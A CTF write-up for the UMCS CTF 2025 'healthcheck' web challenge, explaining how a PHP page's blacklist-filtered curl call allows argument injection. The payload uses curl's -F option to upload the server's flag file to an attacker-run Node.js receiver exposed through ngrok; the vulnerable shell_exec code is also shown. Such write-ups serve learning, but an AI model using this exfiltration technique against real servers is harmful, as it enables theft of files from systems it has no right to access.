---
title:  "UMCS CTF 2025 (Preliminary) - Writeup (Web Exploitation - healthcheck)"
date:   2025-04-14 11:20:00 +0800
categories: [CTF Writeup, Web Exploitation]
tags: [UMCS CTF 2025 (Preliminary)]
---
> This challenge was completed during the CTF.
{: .prompt-info}

## The Problem

We were a given a page that allows us to submit a url for it to return its status code.

![](assets/img/image8.png)

> Image are pulled after the CTF ended, thus a message about bruteforcing are shown by the challenge creator
{: .prompt-info}

## Step 1 (Initial Analysis)

From the website, it seems like the site receives an url from the user, fetch the url on the server and returns the status code to the user/front-end.

This seems to allow for a RCE (Remote Code Execution) as the server fetches a file/website from an url but there is no sign of code execution from the server.

![](assets/img/image9.png)

After we fill in the url (in this example, Google url), the status code of the website is shown as 200.

As to know how the server fetches the url,  we have to analyse its source code. Good thing that the source code is provided.

## Step 2 (Analyse the source code)

The source code is provided by a file below

index.php

```php
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["url"])) {
    $url = $_POST["url"];

    $blacklist = [PHP_EOL,'$',';','&','#','`','|','*','?','~','<','>','^','<','>','(', ')', '[', ']', '{', '}', '\\'];

    $sanitized_url = str_replace($blacklist, '', $url);

    $command = "curl -s -D - -o /dev/null " . $sanitized_url . " | grep -oP '^HTTP.+[0-9]{3}'";

    $output = shell_exec($command);
    if ($output) {
        $response_message .= "<p><strong>Response Code:</strong> " . htmlspecialchars($output) . "</p>";
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>URL HTTP Status Checker</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            width: 100%;
            text-align: center;
            display: grid;
        }
        input[type="text"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
        }
        button {
            padding: 10px 20px;
            background-color: #007BFF;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        p {
            font-size: 14px;
            color: #333;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Health Check Your Webpage</h2>
        <form method="POST">
            <input type="text" name="url" placeholder="Enter URL" required>
            <button type="submit">Check</button>
        </form>
        <?php 
        echo $response_message; 
        ?>
    </div>
</body>
</html>
```

From the source code, we see that the server uses `curl` to fetch the url given by the user. But, after the server receives the file from the url, it only pulls the response code and ignore the content of the file. Thus, RCE aren't possible in this challenge.

```php
    $command = "curl -s -D - -o /dev/null " . $sanitized_url . " | grep -oP '^HTTP.+[0-9]{3}'";

    $output = shell_exec($command);
    if ($output) {
        $response_message .= "<p><strong>Response Code:</strong> " . htmlspecialchars($output) . "</p>";
    }
```

After that, we can see a list of blacklist symbols/text which are removed from the url we given such as php code and also bunch of symbols. 

```php
$url = $_POST["url"];

    $blacklist = [PHP_EOL,'$',';','&','#','`','|','*','?','~','<','>','^','<','>','(', ')', '[', ']', '{', '}', '\\'];

    $sanitized_url = str_replace($blacklist, '', $url);
```

And another important key here is that, after the sanitation of the url is done, it is directly put into the command of curl without any further modifications which indicates that here is the place of our exploitation. 

```php
$command = "curl -s -D - -o /dev/null " . $sanitized_url . " | grep -oP '^HTTP.+[0-9]{3}'";
```

So, the mission is to find a way to run a code or exploit the command line here. But, if you seen here, symbols such as `|` or `\` are also inside the blacklist thus making it almost impossible to add another command here. Even if we can run a command to output the flag file, we have no way to send it to the front-end as the variable is hardcoded to only pull the status code. If you try here, it will leave empty if you interrupt the curl command.

So, our next point of interest is the curl command itself. Since we cannot output the flag via the front-end, like other web challenge, we need to find a way to send the flag to other place. Going through the blacklist again, we see that dash symbol `-` aren't sanitised here. So, here we can add other arguments to curl to maybe making a POST request instead of GET to help push the flag file.

## Step 3 (Exploitation)

Reference: [https://everything.curl.dev/http/post/postvspost.html](https://everything.curl.dev/http/post/postvspost.html)

Searching through the curl's documentation, there are some few options we can use but I decided to use `-F` argument to make curl push a file via a form data instead of just post a file to a server. So, I use the following additional command to make curl push the file instead of getting the file from the server.

```bash
-F file=@<the flag file> <ip address of server>
```

Next, after we know how to push the file, we need to create a server that can retrieve our file from the server. So, I've decided to use nodejs server instead since I am well verse a bit with javascript. The script as follows.

```js
const express = require('express');
const multer = require('multer');
const fs = require('fs');
const path = require('path');

// Set up storage (in memory or to disk)
const upload = multer({ dest: 'uploads/' }); // files will be saved to ./uploads/

const app = express();
const PORT = 3000;

// POST endpoint to receive the file
app.post('/upload', upload.single('file'), (req, res) => {
    if (!req.file) {
        return res.status(400).send('No file uploaded.');
    }

    const originalName = req.file.originalname;
    const savedPath = path.resolve(req.file.path);

    console.log(`File received: ${originalName}`);
    console.log(`Saved to: ${savedPath}`);

    // Optional: read and respond with the file content
    const fileContent = fs.readFileSync(savedPath, 'utf-8');
    console.log("File contents:", fileContent);

    res.send(`File "${originalName}" received.\n\nContents:\n${fileContent}`);
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});

```

The server will retrieve and save the content into a file in `uploads/`. Then, since this server runs locally, I need a way for the server to reach this locally hosted server. For that, I've used ngrok to obtain an public hostname for the server to connect.

Using this command, this will forward http protocol at port 80 to my nodejs server which is hosted at port 3000.

>You can follow instructions over at [ngrok](https://ngrok.com/docs/getting-started/) on how to setup your own ngrok server.
{: .prompt-info}

```bash
ngrok http 3000
```

![](assets/img/image10.png)

Now, we need to determine what or where is the flag file. The file is usually on the same directory or the root of the filesystem. But, doing exploitation using `flag.txt` will show nothing as the curl fails to access the file. Looking back at the challenge description, it says that it wants you to fetch `hopes_and_dreams` on the server. Thus, we don't really need to actually brute-force to find where the file is.

![](assets/img/image11.png)

Thus, this is the final command with the payload I use to send to the server.

```bash
curl -F url="file=@hopes_and_dreams <public hostname of nodejs server>" <ip address of server>
```

>Running the command gives us the flag here `umcs{n1c3_j0b_ste4l1ng_myh0p3_4nd_dr3ams}`
{: .prompt-tip} 

## Closing

For this challenge, I think this is quite easy if you know some knowledge of using terminal/command line. You would instantly recognize what you can do here and exploit it. But, what makes it hard is that the person has to setup their own server to receive the script. And I am proud to say this is my first CTF challenge that I've been able to submit the flag. Thank you everyone and I'll see you in the next one.